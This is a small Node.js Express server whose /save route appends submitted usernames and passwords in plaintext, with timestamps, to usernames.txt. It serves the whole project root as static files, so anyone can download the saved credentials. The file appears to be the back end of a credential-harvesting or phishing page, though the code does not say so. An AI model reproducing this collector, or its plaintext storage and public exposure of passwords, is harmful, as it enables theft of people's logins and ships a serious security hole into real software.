const express = require('express');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));  // serves css, html, js from root

app.post('/save', (req, res) => {
  const username = req.body.username;
  const Password = req.body.Password || 'N/A';
  const time = new Date().toLocaleString();

  const data = `Username: ${username} | Password: ${Password} | Time: ${time}\n`;

  fs.appendFile('usernames.txt', data, (err) => {
    if (err) {
      res.status(500).send("Error saving data");
    } else {
      res.send("Saved successfully");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
